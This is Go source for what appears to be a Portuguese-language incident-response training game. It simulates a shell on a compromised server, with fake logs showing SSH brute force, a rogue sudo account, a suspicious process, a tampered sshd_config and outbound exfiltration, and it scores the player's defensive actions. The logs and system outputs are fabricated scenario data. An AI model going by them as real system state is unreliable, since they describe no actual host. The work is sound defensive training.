func copyVirtual(g *Session, source, destination string, elapsed int) (string, string, error) {
	src := normalizeVirtualPath(g.Cwd, source)
	dst := normalizeVirtualPath(g.Cwd, destination)
	if !virtualIsFile(g, src, elapsed) {
		return src, dst, fmt.Errorf("cp: não foi possível obter estado de '%s': arquivo inexistente", source)
	}
	if virtualIsDir(g, dst, elapsed) {
		dst = path.Join(dst, path.Base(src))
	}
	if !virtualIsDir(g, path.Dir(dst), elapsed) {
		return src, dst, fmt.Errorf("cp: não foi possível criar '%s': diretório pai inexistente", destination)
	}
	content, err := virtualReadFile(g, src, elapsed)
	if err != nil {
		return src, dst, fmt.Errorf("cp: %v", err)
	}
	delete(g.Removed, dst)
	g.Files[dst] = content
	return src, dst, nil
}

func moveCommand(g *Session, parts []string, elapsed int) string {
	if len(parts) != 3 {
		return "Uso: mv <origem> <destino>"
	}
	src, dst, err := copyVirtual(g, parts[1], parts[2], elapsed)
	if err != nil {
		return err.Error()
	}
	delete(g.Files, src)
	delete(g.Dirs, src)
	g.Removed[src] = true
	return conditional(dst != normalizeVirtualPath(g.Cwd, parts[2]), "", "")
}

func realpathCommand(g *Session, parts []string, elapsed int) string {
	if len(parts) < 2 {
		return g.Cwd
	}
	out := []string{}
	for _, value := range parts[1:] {
		p := normalizeVirtualPath(g.Cwd, value)
		if !virtualExists(g, p, elapsed) {
			out = append(out, "realpath: "+value+": arquivo ou diretório inexistente")
		} else {
			out = append(out, p)
		}
	}
	return strings.Join(out, "\n")
}

func completionForLine(g *Session, line string, cursor int, elapsed int) CompleteResponse {
	if cursor < 0 || cursor > len(line) {
		cursor = len(line)
	}
	start := cursor
	for start > 0 && line[start-1] != ' ' && line[start-1] != '\t' {
		start--
	}
	end := cursor
	for end < len(line) && line[end] != ' ' && line[end] != '\t' {
		end++
	}
	current := line[start:cursor]
	before := strings.TrimSpace(line[:cursor])
	tokens, _ := shellWords(before)
	tokenIndex := len(tokens) - 1
	if cursor > 0 && (line[cursor-1] == ' ' || line[cursor-1] == '\t') {
		tokenIndex = len(tokens)
		current = ""
		start = cursor
		end = cursor
	}
	if len(tokens) == 0 {
		tokenIndex = 0
	}

	commandIndex := 0
	commandName := ""
	if len(tokens) > 0 {
		commandName = strings.ToLower(tokens[0])
	}
	if commandName == "sudo" {
		commandIndex = 1
		if len(tokens) > 1 {
			commandName = strings.ToLower(tokens[1])
		} else {
			commandName = ""
		}
	}
	if tokenIndex == commandIndex {
		items := []CompletionItem{}
		for _, cmd := range strings.Fields(knownCommandsText) {
			if strings.HasPrefix(cmd, current) {
				items = append(items, CompletionItem{cmd, false})
			}
		}
		sort.Slice(items, func(i, j int) bool { return items[i].Value < items[j].Value })
		return CompleteResponse{start, end, current, items}
	}

	argIndex := tokenIndex - commandIndex - 1
	dirsOnly := commandName == "cd" || commandName == "pushd" || commandName == "rmdir"
	pathCommand := map[string]bool{
		"cd": true, "ls": true, "dir": true, "tree": true, "cat": true, "less": true, "more": true, "head": true, "tail": true,
		"grep": true, "egrep": true, "fgrep": true, "find": true, "stat": true, "file": true, "wc": true, "du": true, "sha256sum": true,
		"md5sum": true, "restore": true, "cp": true, "mv": true, "mkdir": true, "touch": true, "rm": true, "rmdir": true, "realpath": true,
		"readlink": true, "chmod": true, "chown": true, "nano": true, "vi": true, "vim": true, "install": true, "rsync": true, "sed": true,
	}
	usePath := pathCommand[commandName]
	if (commandName == "grep" || commandName == "egrep" || commandName == "fgrep") && argIndex == 0 {
		usePath = false
	}
	if usePath || strings.Contains(current, "/") || strings.HasPrefix(current, ".") || strings.HasPrefix(current, "~") {
		return CompleteResponse{start, end, current, virtualPathCompletions(g, current, dirsOnly, elapsed)}
	}
	pools := map[string][]string{
		"help":      {"sistema", "arquivos", "processos", "rede", "servicos", "seguranca"},
		"systemctl": {"status", "list-units", "is-active", "is-enabled", "restart", "stop", "start", "ssh", "unknown-worker"},
		"service":   {"--status-all", "ssh", "web"},
		"id":        {"root", "student", "system-update"}, "groups": {"root", "student", "system-update"},
		"passwd": {"root", "student", "system-update"}, "usermod": {"root", "student", "system-update"},
		"block": {"203.0.113.77", "198.51.100.42"}, "ping": {"203.0.113.77", "198.51.100.42", "10.0.0.15"},
		"kill": {"-9", "731", "101", "204"}, "pkill": {"unknown-worker", "sshd", "web-server"},
		"patch": {"ssh"}, "ip": {"addr", "route", "neigh"}, "apt": {"update", "list", "install"}, "apt-get": {"update", "install"},
	}
	items := []CompletionItem{}
	for _, value := range pools[commandName] {
		if strings.HasPrefix(value, current) {
			items = append(items, CompletionItem{value, false})
		}
	}
	sort.Slice(items, func(i, j int) bool { return items[i].Value < items[j].Value })
	return CompleteResponse{start, end, current, items}
}

func virtualPathCompletions(g *Session, token string, dirsOnly bool, elapsed int) []CompletionItem {
	if token == "~" {
		return []CompletionItem{{"~/", true}}
	}
	slash := strings.LastIndex(token, "/")
	baseTyped, prefix := "", token
	if slash >= 0 {
		baseTyped, prefix = token[:slash+1], token[slash+1:]
	}
	lookup := g.Cwd
	if baseTyped != "" {
		lookup = normalizeVirtualPath(g.Cwd, baseTyped)
	}
	if !virtualIsDir(g, lookup, elapsed) {
		return []CompletionItem{}
	}
	children := virtualChildren(g, lookup, elapsed)
	items := []CompletionItem{}
	for name, isDir := range children {
		if dirsOnly && !isDir {
			continue
		}
		if !strings.HasPrefix(name, prefix) {
			continue
		}
		if strings.HasPrefix(name, ".") && !strings.HasPrefix(prefix, ".") {
			continue
		}
		value := baseTyped + name
		if isDir {
			value += "/"
		}
		items = append(items, CompletionItem{value, isDir})
	}
	sort.Slice(items, func(i, j int) bool { return items[i].Value < items[j].Value })
	return items
}

func runSelfTest() error {
	testSession := &Session{
		Blocked: map[string]bool{}, Locked: map[string]bool{}, Killed: map[int]bool{},
		Restored: map[string]bool{}, Patched: map[string]bool{}, Announced: map[string]bool{},
		Cwd: "/root", PrevCwd: "/root", Files: map[string]string{}, Dirs: map[string]bool{}, Removed: map[string]bool{},
	}
	exact := runVirtualGrep([]string{"grep", "Failed", "/var/log/auth.log"}, "", 20, testSession)
	if !strings.Contains(exact, "Failed password for root") {
		return fmt.Errorf("grep não encontrou Failed: %q", exact)
	}
	if cd := cdCommand(testSession, []string{"cd", "/etc/ssh"}, 20); cd != "" || testSession.Cwd != "/etc/ssh" {
		return fmt.Errorf("cd virtual falhou: %q cwd=%q", cd, testSession.Cwd)
	}
	listing := lsCommand(testSession, []string{"ls"}, 20)
	if !strings.Contains(listing, "sshd_config") {
		return fmt.Errorf("ls virtual não listou sshd_config: %q", listing)
	}
	content := fileContent("sshd_config", 20, testSession)
	if !strings.Contains(content, "PasswordAuthentication") {
		return fmt.Errorf("cat relativo falhou: %q", content)
	}
	comp := completionForLine(testSession, "cat sshd_", len("cat sshd_"), 20)
	if len(comp.Items) == 0 || comp.Items[0].Value != "sshd_config" {
		return fmt.Errorf("autocomplete de caminho falhou: %#v", comp.Items)
	}
	if len(buildEmailSchedule()) != len(emailDefinitions) {
		return fmt.Errorf("agenda de e-mails incompleta")
	}
	seenEmails := map[string]bool{}
	for _, delivery := range buildEmailSchedule() {
		if seenEmails[delivery.ID] {
			return fmt.Errorf("e-mail repetido na agenda: %s", delivery.ID)
		}
		seenEmails[delivery.ID] = true
	}
	return nil
}

func processOutput(elapsed int, g *Session, full bool) string {
	if full {
		lines := []string{"USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND", "root         1  0.0  0.7  24500  3800 ?        Ss   Jul17   0:04 /sbin/init", "root       101  0.0  1.2  31200  6200 ?        Ss   09:10   0:01 /usr/sbin/sshd -D", "web        204  2.0  4.8  65000 24800 ?        Ssl  09:11   1:22 /usr/local/bin/web-server"}
		if elapsed >= 85 && !g.Killed[731] {
			lines = append(lines, "system-u   731 48.2  9.1  84000 46600 ?        R    15:02   0:42 /var/tmp/.cache/unknown-worker [SUSPEITO]")
		}
		return strings.Join(lines, "\n")
	}
	if elapsed >= 85 && !g.Killed[731] {
		return "PID  USUÁRIO         CPU   PROCESSO\n101  root            0%    ssh-service\n204  web             2%    web-server\n731  system-update  48%    unknown-worker  [SUSPEITO]"
	}
	return "PID  USUÁRIO   CPU   PROCESSO\n101  root      0%    ssh-service\n204  web       2%    web-server"
}

func topOutput(elapsed int, g *Session) string {
	tasks := "93 total, 1 running, 92 sleeping, 0 stopped, 0 zombie"
	cpu := "3.0 us, 2.0 sy, 0.0 ni, 94.0 id, 1.0 wa"
	if elapsed >= 85 && !g.Killed[731] {
		cpu = "52.0 us, 4.0 sy, 0.0 ni, 43.0 id, 1.0 wa"
	}
	return "top - " + time.Now().Format("15:04:05") + " up 3 days, 4:17, 1 user, load average: " + conditional(elapsed >= 85, "1.84, 0.92, 0.31", "0.08, 0.05, 0.01") + "\nTasks: " + tasks + "\n%Cpu(s): " + cpu + "\nMiB Mem : 512.0 total, 96.0 free, 214.0 used, 202.0 buff/cache\n\n" + processOutput(elapsed, g, true)
}

func pstreeOutput(elapsed int, g *Session) string {
	out := "systemd─┬─sshd───sshd───bash\n        ├─web-server\n        └─journald"
	if elapsed >= 85 && !g.Killed[731] {
		out += "\n        └─unknown-worker [SUSPEITO]"
	}
	return out
}

func pgrepOutput(parts []string, elapsed int, g *Session) string {
	if len(parts) < 2 {
		return "Uso: " + parts[0] + " <nome>"
	}
	name := parts[len(parts)-1]
	if strings.Contains(name, "ssh") {
		return "101"
	}
	if strings.Contains(name, "web") {
		return "204"
	}
	if strings.Contains(name, "unknown") && elapsed >= 85 && !g.Killed[731] {
		return "731"
	}
	return ""
}

func lsofOutput(elapsed int, g *Session, clean string) string {
	lines := []string{"COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAME", "sshd    101 root 3u IPv4  19283      0t0  TCP *:22 (LISTEN)", "web     204 web  6u IPv4  19301      0t0  TCP *:8080 (LISTEN)"}
	if elapsed >= 170 && !g.Blocked["198.51.100.42"] {
		lines = append(lines, "unknown 731 system-update 7u IPv4 20114 0t0 TCP 10.0.0.15:49022->198.51.100.42:443 (ESTABLISHED) [SUSPEITO]")
	}
	return strings.Join(lines, "\n")
}

func connectionOutput(elapsed int, g *Session) string {
	lines := []string{"Netid State       Local Address:Port   Peer Address:Port     Process", "tcp   LISTEN      0.0.0.0:22           0.0.0.0:*             users:((sshd,pid=101))", "tcp   LISTEN      0.0.0.0:8080         0.0.0.0:*             users:((web,pid=204))"}
	if elapsed >= 15 && !g.Blocked["203.0.113.77"] {
		lines = append(lines, "tcp   SYN-RECV    10.0.0.15:22         203.0.113.77:54120   users:((sshd,pid=101)) [REPETIDO]")
	}
	if elapsed >= 170 && !g.Blocked["198.51.100.42"] {
		lines = append(lines, "tcp   ESTAB       10.0.0.15:49022      198.51.100.42:443    users:((unknown-worker,pid=731)) [SAÍDA]")
	}
	return strings.Join(lines, "\n")
}

func ipOutput(parts []string) string {
	sub := "addr"
	if len(parts) > 1 {
		sub = parts[1]
	}
	switch sub {
	case "a", "addr", "address":
		return "1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536\n    inet 127.0.0.1/8 scope host lo\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500\n    inet 10.0.0.15/24 brd 10.0.0.255 scope global eth0"
	case "r", "route":
		return "default via 10.0.0.1 dev eth0\n10.0.0.0/24 dev eth0 proto kernel scope link src 10.0.0.15"
	case "n", "neigh":
		return "10.0.0.1 dev eth0 lladdr 02:00:00:00:00:01 REACHABLE"
	}
	return "Uso: ip addr | ip route | ip neigh"
}

func tcpdumpOutput(elapsed int, g *Session) string {
	lines := []string{"15:04:01.120 IP 192.0.2.10.50122 > 10.0.0.15.22: Flags [P.], length 52"}
	if elapsed >= 15 && !g.Blocked["203.0.113.77"] {
		lines = append(lines, "15:04:02.004 IP 203.0.113.77.54120 > 10.0.0.15.22: Flags [S], seq 884120 [REPETIDO]")
	}
	if elapsed >= 170 && !g.Blocked["198.51.100.42"] {
		lines = append(lines, "15:04:03.882 IP 10.0.0.15.49022 > 198.51.100.42.443: Flags [P.], length 1460 [SUSPEITO]")
	}
	return strings.Join(lines, "\n")
}

func servicesOutput(g *Session) string {
	sshStatus := "ativo / vulnerável"
	if g.Patched["ssh"] {
		sshStatus = "ativo / corrigido"
	}
	return "SERVIÇO       ESTADO\nssh           " + sshStatus + "\nweb           ativo\naudit         ativo"
}

func systemctlOutput(parts []string, g *Session) string {
	if len(parts) == 1 || (len(parts) > 1 && strings.HasPrefix(parts[1], "list")) {
		return "UNIT                     LOAD   ACTIVE SUB     DESCRIPTION\nssh.service              loaded active running OpenBSD Secure Shell server\nweb.service              loaded active running Training web server\nsystemd-journald.service loaded active running Journal Service"
	}
	action := parts[1]
	service := "ssh"
	if len(parts) > 2 {
		service = strings.TrimSuffix(parts[len(parts)-1], ".service")
	}
	status := "active (running)"
	if service == "ssh" && g.Patched["ssh"] {
		status += " — política corrigida"
	}
	switch action {
	case "status":
		return "● " + service + ".service - Serviço simulado\n     Loaded: loaded (/lib/systemd/system/" + service + ".service; enabled)\n     Active: " + status + " since Mon 2026-07-20 09:10:00 -03"
	case "is-active":
		if service == "unknown-worker" && g.Killed[731] {
			return "inactive"
		}
		return "active"
	case "is-enabled":
		return "enabled"
	case "stop":
		if service == "unknown-worker" {
			return "__STOP_UNKNOWN_WORKER__"
		}
		return "Serviço " + service + " parado na simulação."
	case "restart", "reload":
		return "Serviço " + service + " " + action + "ado na simulação. Isso não aplica correções de segurança por si só."
	}
	return "Ação systemctl reconhecida apenas parcialmente. Use status, list-units, is-active ou restart."
}

func journalOutput(elapsed int) string {
	return "-- Logs begin at Sun 2026-07-19 10:00:00 -03 --\n" + logsOutput(elapsed)
}

func filesOutput(elapsed int, g *Session) string {
	if elapsed >= 125 && !g.Restored["/etc/ssh/sshd_config"] {
		return "ARQUIVO                        INTEGRIDADE\n/etc/passwd                    OK\n/etc/shadow                    OK\n/etc/ssh/sshd_config           ALTERADO [SUSPEITO]"
	}
	return "ARQUIVO                        INTEGRIDADE\n/etc/passwd                    OK\n/etc/shadow                    OK\n/etc/ssh/sshd_config           OK"
}

func (s *Server) blockAddress(g *Session, ip string, elapsed int) string {
	if ip == "203.0.113.77" && elapsed >= 15 && !g.Blocked[ip] {
		g.Blocked[ip] = true
		g.Score += 180
		return "[OK] Endereço 203.0.113.77 bloqueado no firewall simulado. +180 pontos"
	}
	if ip == "198.51.100.42" && elapsed >= 170 && !g.Blocked[ip] {
		g.Blocked[ip] = true
		g.Score += 220
		return "[OK] Destino 198.51.100.42 bloqueado. Exfiltração interrompida. +220 pontos"
	}
	if g.Blocked[ip] {
		return "Endereço já está bloqueado."
	}
	return s.falsePositive(g, "Endereço sem evidência suficiente; conexão legítima afetada.")
}

func (s *Server) lockUser(g *Session, user string, elapsed int) string {
	if user == "system-update" && elapsed >= 50 && !g.Locked[user] {
		g.Locked[user] = true
		g.Score += 220
		return "[OK] Conta system-update bloqueada e sessões revogadas. +220 pontos"
	}
	if g.Locked[user] {
		return "Conta já está bloqueada."
	}
	return s.falsePositive(g, "Conta legítima bloqueada sem evidência.")
}

func (s *Server) killCommand(g *Session, parts []string, elapsed int) string {
	if len(parts) < 2 {
		return "Uso: kill [-9] <pid>"
	}
	pidText := parts[len(parts)-1]
	pid, err := strconv.Atoi(pidText)
	if err != nil {
		return "PID inválido."
	}
	if pid == 731 && elapsed >= 85 && !g.Killed[pid] {
		g.Killed[pid] = true
		g.Score += 230
		return "[OK] Processo 731 interrompido e memória isolada. +230 pontos"
	}
	if g.Killed[pid] {
		return "Processo já foi interrompido."
	}
	return s.falsePositive(g, "Processo legítimo interrompido; serviço degradado.")
}

func (s *Server) pkillCommand(g *Session, parts []string, elapsed int) string {
	if len(parts) < 2 {
		return "Uso: " + parts[0] + " <nome>"
	}
	name := parts[len(parts)-1]
	if (name == "unknown-worker" || name == "unknown") && elapsed >= 85 {
		return s.killCommand(g, []string{"kill", "731"}, elapsed)
	}
	return s.falsePositive(g, "Nenhum processo malicioso corresponde ao nome informado.")
}

func (s *Server) restoreFile(g *Session, file string, elapsed int) string {
	file = normalizeVirtualPath(g.Cwd, file)
	if file == "/etc/ssh/sshd_config" && elapsed >= 125 && !g.Restored[file] {
		g.Restored[file] = true
		delete(g.Files, file)
		delete(g.Removed, file)
		g.Score += 230
		return "[OK] /etc/ssh/sshd_config restaurado a partir da cópia íntegra. +230 pontos"
	}
	if g.Restored[file] {
		return "Arquivo já foi restaurado."
	}
	return s.falsePositive(g, "Restauração indevida alterou um arquivo íntegro.")
}

func (s *Server) copyCommand(g *Session, parts []string, elapsed int) string {
	if len(parts) != 3 {
		return "Uso: cp <origem> <destino>"
	}
	src, dst, err := copyVirtual(g, parts[1], parts[2], elapsed)
	if err != nil {
		return err.Error()
	}
	if (src == "/root/backups/sshd_config.clean" || src == "/var/backups/sshd_config.clean") && dst == "/etc/ssh/sshd_config" {
		return s.restoreFile(g, dst, elapsed)
	}
	return ""
}

func (s *Server) patchService(g *Session, service string, elapsed int) string {
	service = strings.TrimSuffix(service, ".service")
	if (service == "ssh" || service == "sshd" || service == "openssh-server") && elapsed >= 15 && !g.Patched["ssh"] {
		g.Patched["ssh"] = true
		g.Score += 170
		return "[OK] Política de autenticação do SSH corrigida. +170 pontos"
	}
	if g.Patched["ssh"] && (service == "ssh" || service == "sshd" || service == "openssh-server") {
		return "Serviço já está corrigido."
	}
	return s.falsePositive(g, "Serviço reiniciado ou alterado sem necessidade; disponibilidade reduzida.")
}

func (s *Server) firewallCommand(g *Session, parts []string, clean string, elapsed int) string {
	if clean == "iptables -l" || strings.HasPrefix(clean, "iptables -l ") || clean == "nft list ruleset" || clean == "ufw status" || strings.Contains(clean, "fail2ban-client status") {
		rules := "POLÍTICA INPUT: ACCEPT\nACCEPT tcp dport 22\nACCEPT tcp dport 8080"
		for ip := range g.Blocked {
			rules += "\nDROP ip saddr " + ip
		}
		return rules
	}
	for _, ip := range []string{"203.0.113.77", "198.51.100.42"} {
		if strings.Contains(clean, ip) && (strings.Contains(clean, "drop") || strings.Contains(clean, "reject") || strings.Contains(clean, "banip") || strings.Contains(clean, "deny") || strings.Contains(clean, "blackhole")) {
			return s.blockAddress(g, ip, elapsed)
		}
	}
	return "Comando de firewall reconhecido, mas nenhuma regra suportada foi identificada. Consulte help seguranca."
}

func (s *Server) userLockCommand(g *Session, parts []string, clean string, elapsed int) string {
	if strings.Contains(clean, " -l ") || strings.Contains(clean, " --lock ") {
		user := parts[len(parts)-1]
		return s.lockUser(g, user, elapsed)
	}
	if strings.Contains(clean, " -s ") && strings.Contains(clean, "nologin") && strings.Contains(clean, "system-update") {
		if g.Locked["system-update"] {
			return "Shell de system-update alterado para /usr/sbin/nologin na simulação."
		}
		return s.lockUser(g, "system-update", elapsed)
	}
	if strings.Contains(clean, " -s ") && parts[0] == "passwd" {
		return "system-update L 2026-07-20 0 99999 7 -1"
	}
	return "Formas suportadas: passwd -l, usermod -L ou usermod -s /usr/sbin/nologin."
}

func (s *Server) aptCommand(g *Session, parts []string, clean string, elapsed int) string {
	if len(parts) == 1 {
		return "apt 2.6.1 (amd64) — interface simulada"
	}
	if parts[1] == "update" {
		return "Atingido:1 http://deb.debian.org/debian bookworm InRelease\nLendo listas de pacotes... Pronto"
	}
	if strings.Contains(clean, "openssh-server") && (strings.Contains(clean, "upgrade") || strings.Contains(clean, "install")) {
		return s.patchService(g, "openssh-server", elapsed)
	}
	if parts[1] == "list" {
		return "openssh-server/stable,now 1:9.2p1 amd64 [installed]\nsystemd/stable,now 252 amd64 [installed]"
	}
	return "Operação apt simulada; nenhum pacote real foi alterado."
}

func conditional(ok bool, yes, no string) string {
	if ok {
		return yes
	}
	return no
}

func (s *Server) falsePositive(g *Session, msg string) string {
	g.Score -= 80
	if g.Score < 0 {
		g.Score = 0
	}
	g.Integrity -= 5
	if g.Integrity < 0 {
		g.Integrity = 0
	}
	return "[FALSO POSITIVO] " + msg + " -80 pontos / -5% integridade"
}

func (s *Server) alertsOutput(g *Session, elapsed int) string {
	lines := []string{}
	if elapsed >= 15 && !(g.Blocked["203.0.113.77"] && g.Patched["ssh"]) {
		lines = append(lines, "[ALTO] Falhas de autenticação SSH")
	}
	if elapsed >= 50 && !g.Locked["system-update"] {
		lines = append(lines, "[ALTO] Conta privilegiada desconhecida")
	}
	if elapsed >= 85 && !g.Killed[731] {
		lines = append(lines, "[ALTO] Processo anômalo PID 731")
	}
	if elapsed >= 125 && !g.Restored["/etc/ssh/sshd_config"] {
		lines = append(lines, "[MÉDIO] Integridade de arquivo violada")
	}
	if elapsed >= 170 && !g.Blocked["198.51.100.42"] {
		lines = append(lines, "[CRÍTICO] Possível exfiltração de dados")
	}
	if len(lines) == 0 {
		return "Nenhum alerta ativo."
	}
	return strings.Join(lines, "\n")
}

func logsOutput(elapsed int) string {
	lines := []string{
		"Jul 20 14:58:01 training-server sshd[101]: Server listening on 0.0.0.0 port 22.",
		"Jul 20 14:58:03 training-server audit[204]: monitoramento de integridade ativo",
	}
	if elapsed >= 15 {
		lines = append(lines,
			"Jul 20 15:00:12 training-server sshd[611]: Failed password for root from 203.0.113.77 port 41822 ssh2",
			"Jul 20 15:00:15 training-server sshd[618]: Failed password for invalid user admin from 203.0.113.77 port 41854 ssh2",
			"Jul 20 15:00:18 training-server sshd[625]: Failed password for root from 203.0.113.77 port 41901 ssh2",
			"Jul 20 15:00:20 training-server sshd[101]: error: maximum authentication attempts exceeded for root from 203.0.113.77 port 41901 ssh2",
		)
	}
	if elapsed >= 50 {
		lines = append(lines, "Jul 20 15:00:52 training-server useradd[702]: conta system-update adicionada ao grupo sudo")
	}
	if elapsed >= 85 {
		lines = append(lines, "Jul 20 15:01:27 training-server kernel: PID 731 abriu execução desconhecida")
	}
	if elapsed >= 125 {
		lines = append(lines, "Jul 20 15:02:07 training-server audit[744]: /etc/ssh/sshd_config modificado por system-update")
	}
	if elapsed >= 170 {
		lines = append(lines, "Jul 20 15:02:52 training-server network: PID 731 conectando continuamente a 198.51.100.42:443")
	}
	return strings.Join(lines, "\n")
}

func (g *Session) addLog(kind, text string) {
	g.History = append(g.History, LogEntry{At: time.Now().Format("15:04:05"), Kind: kind, Text: text})
	if len(g.History) > 120 {
		g.History = g.History[len(g.History)-120:]
	}
}

func (g *Session) addCommandLog(command, output, cwd string) {
	text := "$ " + command
	if output != "" {
		text += "\n" + output
	}
	g.History = append(g.History, LogEntry{At: time.Now().Format("15:04:05"), Kind: "command", Text: text, Cwd: cwd})
	if len(g.History) > 120 {
		g.History = g.History[len(g.History)-120:]
	}
}

func (s *Server) sessionFromRequestLocked(r *http.Request) *Session {
	cookie, err := r.Cookie(sessionCookie)
	if err != nil {
		return nil
	}
	return s.sessions[cookie.Value]
}

func (s *Server) evictOldestLocked() {
	var oldestID string
	var oldest time.Time
	for id, g := range s.sessions {
		if oldestID == "" || g.LastSeen.Before(oldest) {
			oldestID, oldest = id, g.LastSeen
		}
	}
	if oldestID != "" {
		delete(s.sessions, oldestID)
	}
}

func (s *Server) cleanupLoop() {
	ticker := time.NewTicker(5 * time.Minute)
	defer ticker.Stop()
	for now := range ticker.C {
		s.mu.Lock()
		for id, g := range s.sessions {
			if now.Sub(g.LastSeen) > 30*time.Minute {
				delete(s.sessions, id)
			}
		}
		s.mu.Unlock()
	}
}

func sanitizeNick(v string) string {
	v = strings.TrimSpace(v)
	if len(v) > 24 {
		v = v[:24]
	}
	var b strings.Builder
	for _, r := range v {
		if (r >= 'a' && r <= 'z') || (r >= 'A' && r <= 'Z') ||
			(r >= '0' && r <= '9') || r == ' ' || r == '-' || r == '_' {
			b.WriteRune(r)
		}
	}
	return strings.TrimSpace(b.String())
}

func randomID(n int) string {
	b := make([]byte, n)
	if _, err := rand.Read(b); err != nil {
		return strconv.FormatInt(time.Now().UnixNano(), 16)
	}
	return hex.EncodeToString(b)
}

func writeJSON(w http.ResponseWriter, value interface{}) {
	w.Header().Set("Content-Type", "application/json; charset=utf-8")
	json.NewEncoder(w).Encode(value)
}

func maxInt(a, b int) int {
	if a > b {
		return a
	}
	return b
}

func (s *Server) rankingPath() string { return filepath.Join(s.dataDir, "ranking.json") }

func (s *Server) loadRanking() {
	data, err := ioutil.ReadFile(s.rankingPath())
	if err != nil {
		return
	}
	if err := json.Unmarshal(data, &s.ranking); err != nil {
		log.Printf("ranking inválido: %v", err)
	}
}

func (s *Server) saveRankingLocked() {
	data, err := json.MarshalIndent(s.ranking, "", "  ")
	if err != nil {
		return
	}
	tmp := s.rankingPath() + ".tmp"
	if err := ioutil.WriteFile(tmp, data, 0640); err != nil {
		log.Printf("erro ao salvar ranking: %v", err)
		return
	}
	if err := os.Rename(tmp, s.rankingPath()); err != nil {
		log.Printf("erro ao publicar ranking: %v", err)
	}
}

